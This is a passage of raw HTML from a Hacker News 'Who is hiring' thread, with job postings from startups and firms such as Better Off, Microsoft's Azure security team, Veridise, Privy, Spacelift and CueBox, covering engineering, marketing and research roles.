href="https://www.ycombinator.com/companies/depot/jobs/307RqGp-founding-developer-marketer">https://www.ycombinator.com/companies/depot/jobs/307RqGp-fou...</a></p><p>Tech stack: Remix, TypeScript, Go</p><p>We're a small, remote team building developer tools we wish we've had. If you're passionate about developer productivity and marketing to technical audiences, we'd love to hear from you.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244972"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244972" href="https://news.ycombinator.com/vote?id=43244972&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Better Off | Growth Marketer | New York, NY (ONSITE)</p><p>Hiring junior level growth marketer @ MIT-founded tech startup for in-person social experiences and better weekends.</p><p>---</p><p>Exec summary:
We're a marketplace like Amazon, but for IRL social experiences like huge brunches, trivia nights, ski trips, sport leagues, paint &amp; wine nights, sushi-making classes, etc for new people/experiences outside work &amp; dating apps.</p><p>Our AI matches users to groups for the experiences based on demographics, personality, prefs (e.g., artists, entrepreneurs, singles, couples, foodies, travel buddies, etc).</p><p>---</p><p>Job Title: Growth Marketer</p><p>Company: Better Off</p><p>Location: New York, NY (ONSITE)</p><p>Salary Range: $55k-$75k + equity</p><p>Space: IRL Social, Artificial Intelligence</p><p>Comments: We’re launching in major cities this year, and we’re looking for a Growth Marketer to join our 12-person team as our first dedicated marketing hire. You’ll work directly with the CEO to build and execute our marketing strategies, grow the brand, get Better Off in front of the right people, and give people an alternative to dating apps.</p><p>--</p><p>Application link/details: <a href="https://app.dover.com/apply/Better%20Off/a32724d0-99e3-448e-bb47-4f8b545c99a4" rel="nofollow">https://app.dover.com/apply/Better%20Off/a32724d0-99e3-448e-...</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244905"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244905" href="https://news.ycombinator.com/vote?id=43244905&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Recital | Remote (Canada) | Full-time | <a href="https://recitalapp.com/" rel="nofollow">https://recitalapp.com</a></p><p>In-house lawyers waste 25% of their time looking for stuff. Recital uses non-obvious ML approaches, uniquely enabled by LLMs, to help them find it. We're diving into the relatively-unexplored data buried in contracts, building layers of data analysis that are shown into an interface that feels simple and easy. It's an AI product that doesn't feel like an AI product.</p><p>We're a small, global, all-remote startup. It's our second startup in the space (the first was acquired). We follow modern product management (discovery) &amp; development (DORA) practices, emphasize developer experience as an accelerator of customer value, and use provably effective management techniques (à la Manager Tools). Our team emphasizes strong emotional intelligence and self-awareness.</p><p>We're looking for Canada-based senior+ full-stack developers, with solid professional experience in both Ruby on Rails and a modern frontend framework (Vue, React, etc). Experience in data wrangling is a bonus.</p><p><a href="https://recitalapp.com/careers/" rel="nofollow">https://recitalapp.com/careers/</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244853"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244853" href="https://news.ycombinator.com/vote?id=43244853&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Microsoft | Cybersecurity | Seattle Area ONSITE (no in-office requirement) | Senior Security Engineer</p><p>The Azure Security DevSec team is looking for a Senior Security Engineer to join us in securing services in the Microsoft Cloud. We work with service teams across Microsoft to evaluate and improve their security posture in the cloud, continuously moving the needle across multiple dimensions of their design, development and deployment security. In this role, you will collaborate with teams across Microsoft to dive deep and evaluate the risk posed by and to a given service, recommend existing mitigations, innovate on mitigations for new issue classes, contributing to the feedback loop that can help achieve these outcomes at scale.</p><p>Application Link - <a href="https://jobs.careers.microsoft.com/global/en/job/1811653/Senior-Security-Engineer" rel="nofollow">https://jobs.careers.microsoft.com/global/en/job/1811653/Sen...</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244925"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244925" href="https://news.ycombinator.com/vote?id=43244925&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Sanctuary Computer | Senior Software Engineer (Backend, Native Android or iOS) | Remote (with office in NYC) | Full-time | NYC</p><p>At Sanctuary Computer — we’re building a different type of technology shop. Based in NYC’s Chinatown (and remote), the way we approach building things is more like a restaurant than a traditional agency, with an emphasis in providing our clients with an outspoken sense of comfort and hospitality.</p><p>We’re looking for a senior generalist software engineer with expertise in backend and/or native app development, and interest in systems architecture and IoT.</p><p>In this role, you’ll work on a variety of client projects to find cost-effective, high-quality, pragmatic solutions to complex problems. You would work on full-stack apps across many industries, from e-commerce to connected hardware products — including projects like the Light Phone OS.</p><p>Read more and apply here: <a href="https://garden3d.notion.site/Senior-Software-Engineer-Backend-Native-Android-or-iOS-192131fea2c780dcab99f3b1296547c9" rel="nofollow">https://garden3d.notion.site/Senior-Software-Engineer-Backen...</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244210"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244210" href="https://news.ycombinator.com/vote?id=43244210&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>SerpApi | <a href="https://serpapi.com/" rel="nofollow">https://serpapi.com</a> | Junior to Senior Fullstack Engineer positions | Customer Success Engineer | Talent Acquisition Specialist | Based in Austin, TX but remote-first structure | Full-time | ONSITE or FULLY REMOTE | $150K - 180K a year 1099 for US or local avg + 20% for outside the US</p><p>SerpApi is the leading API to scrape and parse search engine results. We deeply support Google, Google Maps, Google Images, Bing, Baidu, and a lot more.</p><p>Our current stack is Ruby, Rails, MongoDB, and React.JS. We are looking for more Junior and Senior FullStack Engineers.
We have an awesome work environment: We are a remote first company (before Covid!).</p><p>We do continuous integration, continuous deployments, code reviews, code pairings, profit sharing, and most of communication is async via GitHub.</p><p>We value super strongly transparency, do open books, have a public roadmap, and contribute to the EFF.</p><p>Apply at: <a href="https://serpapi.com/careers" rel="nofollow">https://serpapi.com/careers</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244767"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244767" href="https://news.ycombinator.com/vote?id=43244767&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Toolhouse| SF/Bay Area Onsite (default) or Remote (if exceptional) | Developer Advocate | <a href="https://toolhouse.ai/" rel="nofollow">https://toolhouse.ai</a> | Full-time</p><p>Toolhouse.ai is on a mission to democratize function calling access to developers, worldwide. We're looking for a passionate and articulate Developer Advocate to join our growing team in the San Francisco Bay Area.</p><p>What You'll Do:</p><p>* Attend and present at local meetups and developer communities.</p><p>* Wow attendees with live/online demos showcasing the capabilities of Toolhouse's SDK</p><p>* Educate developers on the potential of LLMs and how Toolhouse.ai simplifies integration with function calling.</p><p>* Network with participants, fostering relationships and building the Toolhouse.ai developer community.</p><p>* Gather feedback from developers to inform product roadmap decisions.</p><p>Who You Are:</p><p>* A passionate developer with understanding of LLMs and their potential applications.</p><p>* Excellent communication and presentation skills, with the ability to engage a technical audience.</p><p>* Experience building and using developer tools a plus.</p><p>* Familiarity with the your local developer meetup scene is preferred.</p><p>* A self-starter with the ability to manage your own schedule and workload (part-time).</p><p>If you're a passionate developer who loves sharing your knowledge and building communities, we want to hear from you! Please get in touch with us by emailing hello@toolhouse.ai subject DevRel - HN and include any relevant links for us to understand who you are and what you have done/can do.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244478"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244478" href="https://news.ycombinator.com/vote?id=43244478&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Veridise | <a href="https://veridise.com/" rel="nofollow">https://veridise.com</a> | REMOTE | Full Time</p><p>ZK Researcher: Veridise is seeking a ZK Researcher to join our team and help design and build new methodologies for verifying the security of ZK technologies.</p><p>This role is ideal for a creative and independent thinker who can identify important security challenges and develop novel solutions.</p><p>Application Link: <a href="https://veridise.com/careers/zk-researcher/" rel="nofollow">https://veridise.com/careers/zk-researcher/</a></p><p>--------------------------------------------------------------------------------</p><p>About Veridise: Veridise performs security audits for smart contracts, zero-knowledge circuits, blockchain implementations, key management services, and other off-chain services like relayers, bridges, wallet integrations, and more. Additionally, many members of the Veridise team research and develop modern security tools designed to tackle the ever-changing landscape of blockchain development, providing novel and automated insights into the security of smart contracts and zero-knowledge circuits.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244661"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244661" href="https://news.ycombinator.com/vote?id=43244661&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>InnoVint | Wine Production Software | Remote (US-based) | FT | Senior BE Developer (Django/Python)</p><p>We're looking for another great back end developer to join our team.  We are a company of 30 large and have been operating for over 10 years. We are <i>not</i> VC backed and operate as an independent company with startup mentality.</p><p>InnoVint is the world's leading SaaS solution for wineries and wine producers. We are and have always been a well-performing, tight knit virtual team that meets several times a year in the real world (usually a wine destination!). About half the team has some wine production experience. If you love the idea of being part of the wine industry, but haven't yet considered combining your experience in SaaS and tech, maybe InnoVint is the perfect company for you. If you are a reformed or aspiring winemaker, that's even better!</p><p>This is a great opportunity to work with an excellent and passionate team, serving a really fun and interesting market - commercial wineries. If you're interested in a more concrete visual understanding of InnoVint's market leading wine production software, here's a short video showing the software in action: <a href="https://www.youtube.com/watch?v=hNBBZz08DWY" rel="nofollow">https://www.youtube.com/watch?v=hNBBZz08DWY</a></p><p>Application link: <a href="https://www.innovint.us/careers/sr-backend-engineer/" rel="nofollow">https://www.innovint.us/careers/sr-backend-engineer/</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244828"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244828" href="https://news.ycombinator.com/vote?id=43244828&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Sanctuary Computer | Internet of Things Technical Lead | Remote (with office in NYC) | Full-time | NYC</p><p>At Sanctuary Computer — we’re building a different type of technology shop. Based in NYC’s Chinatown (and remote), the way we approach building things is more like a restaurant than a traditional agency, with an emphasis in providing our clients with an outspoken sense of comfort and hospitality.</p><p>We’re looking for an Internet of Things Technical Lead with experience leading projects and collaborating closely with product owners.</p><p>You’ll be joining our team as a senior developer eager to find cost-effective, high-quality, pragmatic solutions to our clients' complex problems. You would be tasked to lead technical direction for connected hardware products — consumer devices, bespoke operating systems like the Light Phone OS, and the digital ecosystems of phone apps and web interfaces that talk to them. You might identify as a Technical Lead, a Technical Architect, or a Technical Program Manager, and — as you might expect with “technical” in the title — you would be the person on the project team most responsible for delivering the most appropriate and cost-effective technical solution for the client’s needs.</p><p>Read more and apply here: <a href="https://garden3d.notion.site/Internet-of-Things-Technical-Lead-192131fea2c7802f94a3e9f6b8101113" rel="nofollow">https://garden3d.notion.site/Internet-of-Things-Technical-Le...</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244633"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244633" href="https://news.ycombinator.com/vote?id=43244633&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div>
                  <p>Erdos Miller | Data Engineering &amp; ML Roles ($120K-$160K + Benefits) | Remote (US) or Hybrid (Houston, TX) | <a href="https://erdosmiller.com/" rel="nofollow">https://erdosmiller.com</a>
We're building technology that sends data through mud - literally. Our telemetry systems operate at extreme depths, temperatures, and pressures, serving both traditional drilling and pioneering sustainable energy applications like geothermal power. As a bootstrapped and profitable company of 35 people, we offer startup-like challenges with established business stability.
Two key roles we're hiring for:
1. Data Engineering:
- Build scalable platform monitoring thousands of drilling devices
- Create anomaly detection, performance monitoring and predictive maintenance systems
2. Machine Learning:
- Develop signal processing/denoising models for wireless telemetry
- Build ML systems for real-time signal recovery in high-noise environments
- Build data pipeline for continuous expansion of data, benchmarking and model deployment
Tech: Backend: Python, PyTorch. Frontend: NextJS, TypeScript, React frontend
Why join:
- Direct impact on real-world systems in a small team
- Unique hardware/software technical challenges
- Growth-focused culture with no red tape
- Help transition drilling tech to sustainable energy
Benefits: Health/dental/vision, 401(k) match, PTO, remote flexibility
Email ken (-at-) erdosmiller.com with your resume and why you're excited about these challenges.
Prefer US Work Authorization. Open to Canada, Europe. No agencies.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244911"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244911" href="https://news.ycombinator.com/vote?id=43244911&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>NOMO | Remote | US-based | Experienced Startup iOS Dev | <a href="https://bit.ly/41rrMds" rel="nofollow">https://bit.ly/41rrMds</a></p><p>What You'll Do</p><p>* Collaborate with CEO and our Head of Engineering to build a great product, 
* Lead dev efforts around our iOS product, and
* Participate in QA &amp; customer research + engagement.</p><p>What We Want</p><p>* Startup experience,
* Know Swift language and Swift UI framework,
* Write clean MMVM code with clean domain layers separation,
* Know Family Controls, Screen Time, and Device Activity SDKs, and
* Usage stats.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243322"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243322" href="https://news.ycombinator.com/vote?id=43243322&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Privy | NYC or Remote | Senior/staff engineering roles (backend, infra, frontend, much more) | Full-Time | <a href="https://privy.io/" rel="nofollow">https://privy.io</a></p><p>Hi, I'm Asta, CTO at the identity and fintech infra startup Privy. We build a wallet and digital asset API that hundreds of companies integrate in order to onboard (30M+) users onto products built with blockchain infra and distributed systems.</p><p>Our mission is to power digital ownership for all users. We believe that using digital assets to power money movement online is the next frontier for user ownership and financial empowerment. We're building foundational infrastructure that enables this.</p><p>We're a small, high-ownership team building a product with incredibly scaled usage (&gt;5M MAUs, massive transaction volume). We've raised $26M from Sequoia &amp; Paradigm. We ship constantly, multiple production releases every week.</p><p>Reach out at join [at] privy.io - these emails go to me. We're actively posting many more roles than listed, let's chat: <a href="https://privy.io/careers" rel="nofollow">https://privy.io/careers</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244148"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244148" href="https://news.ycombinator.com/vote?id=43244148&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Charge Robotics | Multiple Roles | Full-time | Onsite / Hybrid | SF Bay Area</p><p>Hi HN! We’re a YC-backed, Series-A startup building robots that build large-scale solar farms.</p><p>Check out a video of our first system here! <a href="https://youtu.be/ZZ2fP1Y5Z2E" rel="nofollow">https://youtu.be/ZZ2fP1Y5Z2E</a></p><p>It turns out that construction companies literally can't build solar fast enough, so what we're doing is a crucial part of switching the grid over to renewable generation.</p><p>You’ll be a key contributor, helping bring our next generation of mobile solar factory to life. Your work will involve architecting, developing, and maintaining high-quality code and documentation for our fleet of robotic delivery vehicles.</p><p>Come work with us if you love:</p><p>* Fast-paced prototype development with software and hardware components</p><p>* Making a positive climate impact through your work</p><p>* Hacking on massive construction equipment!</p><p>Robotics Software Engineer: <a href="https://www.workatastartup.com/jobs/51266" rel="nofollow">https://www.workatastartup.com/jobs/51266</a></p><p>Electrical Engineer: <a href="https://www.workatastartup.com/jobs/69674" rel="nofollow">https://www.workatastartup.com/jobs/69674</a></p><p>Lead Technician: <a href="https://www.workatastartup.com/jobs/69838" rel="nofollow">https://www.workatastartup.com/jobs/69838</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244693"><td></td></tr>
            <tr id="43244672"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244672" href="https://news.ycombinator.com/vote?id=43244672&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Equals | <a href="https://equals.com/" rel="nofollow">https://equals.com</a> | ONSITE (New York City) | Full-time | Software Engineers and Product Managers</p><p>We're building a new spreadsheet, connected to your Stripe, Salesforce and Hubspot data, and your SQL warehouse. We're used by companies like Notion, Intercom, Descript, Attio, and more.</p><p>I sincerely believe we have some of the most interesting technical work you'll find at a company of our size (17 people). Building a spreadsheet in the browser is hard!</p><p>For our PM role, you'll be our first PM and own a very very broad surface area.</p><p>Backed by A16Z and Craft. Team is ex-Intercom, Amazon, Meta, etc.</p><p>PM Role: <a href="https://jobs.ashbyhq.com/equals/c936a100-5cf5-4f7b-8e65-ef9438441f99" rel="nofollow">https://jobs.ashbyhq.com/equals/c936a100-5cf5-4f7b-8e65-ef94...</a>
Eng Role: not posted yet but email ben@equals.com if interested</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244539"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244539" href="https://news.ycombinator.com/vote?id=43244539&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Dialog | Remote (US/Canada, EST hours req.) | Full-Time | Technology Associate | $90k-$120k</p><p>Dialog’s mission is to help leaders learn and become more effective by facilitating deep, off-the-record conversations for influential participants from various backgrounds and ideologies. Since its founding in 2006 by Peter Thiel and Auren Hoffman, Dialog has gathered thousands of leaders in political, business, tech, creative, military, and academic disciplines from over 50 countries for invite-only retreats.</p><p>You are:</p><p>A) A low / no-code developer with the ability to write or edit basic scripts to use in automations</p><p>OR</p><p>B) A software developer with knowledge/experience in relational database structures, interested in putting your engineering mind to use in low / no-code systems</p><p>Experience:</p><p>- 2-5 years as a low / no-code expert OR 2-5 years as a software engineer with experience or interest in building with low / no-code tools</p><p>- Solid understanding of relational database structures</p><p>- Tech support experience</p><p>- Detail-oriented, fast communicator, and able to manage tasks urgently</p><p>- Portfolio showing your passion for tech (projects, freelance work, etc.)</p><p>You’ll be the third member of the Tech team at Dialog, an organization with:</p><p>- Major growth opportunities</p><p>- Remote work (forever)</p><p>More details (including application instructions) here: <a href="https://docs.google.com/document/d/1_Xu_3ZxcQmukmTcrDQySyEeHBbVMZHkQ8Ic6SCeCCAo/view" rel="nofollow">https://docs.google.com/document/d/1_Xu_3ZxcQmukmTcrDQySyEeH...</a></p><p>Please mention HN in your email.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244555"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244555" href="https://news.ycombinator.com/vote?id=43244555&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Moonbase AS | <a href="https://moonbase.sh/" rel="nofollow">https://moonbase.sh</a> | Remote (Europe) | Part-time / co-founder | Lead Commercial Growth</p><p>Moonbase is building the ultimate e-commerce platform for indie software developers. We're already trusted by innovative indie studios and growing fast—with zero marketing. Now, we need YOU to take us to the next level.</p><p>This is your chance to shape and lead the commercial side of a high-potential startup from the ground up. We're talking strategy, marketing, sales, partnerships — the whole package.</p><p>We're a bootstrapped startup, building a lifestyle company, and are looking at bringing on a third founder to help us cover what we don't do well today. So if this appeals to you, get in touch with me at tobias@moonbase.sh or read more here: <a href="https://thehub.io/jobs/67a512995a0d1e7c9ade895f" rel="nofollow">https://thehub.io/jobs/67a512995a0d1e7c9ade895f</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244578"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244578" href="https://news.ycombinator.com/vote?id=43244578&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>OneSignal | California, New York, Pennsylvania, Texas, Utah, Washington | Onsite or Remote (Within Supported States) | Full Time | <a href="https://onesignal.com/careers" rel="nofollow">https://onesignal.com/careers</a> Tech stack includes Go, Rust, Ruby on Rails, Kafka, Postgres, Redis, InfluxDB, Typescript, React
OneSignal is building the best platform for businesses to intelligently engage with customers across every channel. We provide a simple interface to push notifications, email, and in-app messages, letting content creators focus on quality user engagement instead of complex implementation.</p><p>We're hiring Senior Software Engineers for our Product, SDK, and SRE teams.</p><p>More information and apply at <a href="https://onesignal.com/careers" rel="nofollow">https://onesignal.com/careers</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243780"><td></td></tr>
            <tr id="43243734"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243734" href="https://news.ycombinator.com/vote?id=43243734&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Sudowrite | REMOTE | √ PMF | Full-Time | Hiring: AI Engineer</p><p>PROFITABLE, SUSTAINABLE SMALL TEAM, MAKING SOMETHING PEOPLE WANT.</p><p>We are a group of friendly, smart, low-drama people, seeking the same to help us make writing tools authors dream about.</p><p>Our users have published hundreds of books using Sudowrite, and we're committed to building a sustainable company, not chasing unrealistic growth targets set by VCs.</p><p>We're on year two of profitability, and not planning to raise again. This will be the second year we've paid out a profit-sharing bonus.</p><p>- Sudowrite is the best AI for authors. We help the next generation of storytellers tell better stories.</p><p>- We believe the future of writing is AI &amp; human collaboration.</p><p>- We've been featured in The New York Times, The New Yorker, and everywhere else we care about.</p><p>- We're 100% remote. We meet in person a few times of year in places like LA, Portland, and Hawaii.</p><p>- We work with a coach and value self-awareness and growth.</p><p>- We encourage diverse candidates within 2 hours of USA timezones to apply.</p><p>We are hiring an AI Engineer who loves literature. Details here: <a href="https://r.people.capital/sudowrite-ai" rel="nofollow">https://r.people.capital/sudowrite-ai</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244273"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244273" href="https://news.ycombinator.com/vote?id=43244273&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div>
                  <p>Seeq | <a href="https://seeq.com/" rel="nofollow">https://seeq.com</a> | Staff Software Engineer (Frontend, Backend) | REMOTE (Some crossover w/ PST required) | Full-time | $140k - $180k + equity. Salary range for US-based; local adjustments for other countries.
Seeq creates cutting-edge data analytics software for industrial process data, serving sectors like pharmaceuticals, energy, and manufacturing. Our core product is a robust calculation engine capable of executing advanced math and machine learning algorithms on streaming time-series data. By leveraging generative AI, we enhance usability and accelerate outcomes for our users.
We've built up a great remote culture (e.g. annual meetups, a remote office app we created to collaborate) and a dev team that enjoys tackling hard problems that make a difference for our customers (dev blog for more: <a href="https://geeq.seeq.com/" rel="nofollow">https://geeq.seeq.com/</a>).
Staff Frontend/Full stack Engineer (React, Typescript, Kotlin): <a href="https://apply.workable.com/seeq/j/79C7DB35A5/" rel="nofollow">https://apply.workable.com/seeq/j/79C7DB35A5/</a>
Staff Backend (Kotlin, Java): <a href="https://apply.workable.com/seeq/j/D862D98145/" rel="nofollow">https://apply.workable.com/seeq/j/D862D98145/</a></p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244725"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244725" href="https://news.ycombinator.com/vote?id=43244725&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Odyssey | Full Stack Engineer | Hybrid | Full-time | NYC</p><p>Odyssey is building the leading financial technology platform for school choice. We help families access funding for tuition, tutors, curriculum, software, and enrichment programs—empowering them with greater educational opportunities.</p><p>We’re well-funded, backed by top investors including Andreessen Horowitz (a16z), and we are rapidly scaling.</p><p>We’re looking for a full-stack engineer to help build and scale the technology powering our platform. You’ll work across the stack-- architecting efficient backend systems, building intuitive front-end interfaces, and ensuring our platform scales efficiently.</p><p>This role is ideal for someone who wants to work on meaningful problems in education &amp; fintech; influence the direction of a fast-growing, venture-backed startup; and collaborate with a passionate team.</p><p>Typescript, AWS, Postgres, Next.js, Tailwind, Terraform, Docker.</p><p><a href="https://jobs.ashbyhq.com/odyssey" rel="nofollow">https://jobs.ashbyhq.com/odyssey</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243440"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243440" href="https://news.ycombinator.com/vote?id=43243440&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Hello Prenup | Senior Software Engineer | REMOTE (US) | Full-time | <a href="https://helloprenup.com/" rel="nofollow">https://helloprenup.com</a> | $150-180k + Equity</p><p>We are driven by our mission to help every couple get on the same page before marriage. We're disrupting an archaic industry in the law space. With our product market fit already in place, we’re poised to accelerate our growth.</p><p>We are seeking an experienced and capable Sr. Software Engineer to work with me, the CTO and be a leader on our growing technical team. You'll work directly with customers and our stakeholders to drive impact, as well as take ownership of the architecture and development of our platform. As the team grows we are also investing in the long term growth of our junior engineers through mentorship.</p><p>We're looking for someone with strong Typescript, React, Node, and PostgreSQL skills to help lead implementation and drive innovation.</p><p>Our tech stack: TypeScript, React, Node (Hono), PostgreSQL. All on Serverless AWS.</p><p>We are a fully remote team across the US and offer competitive compensation, paid for health insurance, and 401k benefits. We have a collaborative work culture that thrives on ambiguity and problem solving.</p><p>If you're interested email sam at our website, and mention hn in the subject.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244368"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244368" href="https://news.ycombinator.com/vote?id=43244368&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Spacelift | Remote (Europe) | Full-time | Senior Software Engineer | $80k-$120k</p><p>We're a VC-funded startup building an automation platform for Infrastructure-as-Code, adding a Policy-as-Code layer above it, in order to make IaC usable in bigger companies, where you have to take care of state consistency, selective permissions, a usable git flow, etc.</p><p>On the backend we're using 100% Go with AWS primitives. We're looking for backend developers who like doing DevOps'y stuff sometimes (because in a way it's the spirit of our company), or have experience with the cloud native ecosystem. Ideally you'd have experience working with an IaC tool, i.e. Terraform, Pulumi, Ansible, CloudFormation, Kubernetes, or SaltStack.</p><p>Overall we have a deeply technical product, trying to build something customers love to use, and already have a lot of happy and satisfied customers. We promise interesting work, the ability to open source parts of the project which don't give us a business advantage, as well as healthy working hours. We've also got investment days on Fridays, when you can work on anything you want, as long as it could possibly benefit Spacelift in some way.</p><p>If that sounds like fun to you, please apply at <a href="https://spacelift.teamtailor.com/jobs/3006934-software-engineer-remote-europe" rel="nofollow">https://spacelift.teamtailor.com/jobs/3006934-software-engin...</a></p><p>You can find out more about the product we're building at <a href="https://spacelift.io/" rel="nofollow">https://spacelift.io</a> and also see our engineering blog for a few technical blog posts of ours: <a href="https://spacelift.io/blog/engineering" rel="nofollow">https://spacelift.io/blog/engineering</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244029"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244029" href="https://news.ycombinator.com/vote?id=43244029&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>CueBox | Backend-Leaning Full Stack Engineer | NYC | Full Time | Onsite - Hybrid</p><p>CueBox is an early stage startup based in NYC. We are a small and mission oriented team of technologists and arts/music enthusiasts. We are building a modern software solution for performing arts and cultural organizations to streamline their operations, build delightful experiences for their patrons, and meaningfully increase their revenue.</p><p>We already have a fast growing and happy customer base comprised of theaters, orchestras, operas, ballets, choruses, performing arts centers, and universities from all across the country, grew revenue by 4x in the last 12 months, and we're just getting started!</p><p>We are looking for an experienced and motivated backend leaning full stack engineer to help us both scale our current system and own new product areas. We use Go, Postgres, Protobuf, Typescript/React, and some Python.</p><p>Candidates should be excited to work in a high velocity early stage startup environment. In addition to technical strength, we highly value autonomy, resourcefulness, curiosity, customer empathy and product intuition.</p><p>For more information and to apply: apply at <a href="https://boards.greenhouse.io/applytocuebox/jobs/5456367004" rel="nofollow">https://boards.greenhouse.io/applytocuebox/jobs/5456367004</a> and mention Hacker News in your application.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244119"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244119" href="https://news.ycombinator.com/vote?id=43244119&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Eureka Surveys | UX Researcher | REMOTE (US) | Part-Time (flexible hours)</p><p>Eureka Surveys (eurekasurveys.com) is one of the largest survey panels in the US, connecting Fortune 500 companies with the opinions of everyday people. We're a small, engineering-first team with a massive user base (9 million and growing!), and we're looking for a talented UX Researcher.</p><p>About the Role:</p><p>- Remote: Work from anywhere within US time zones.
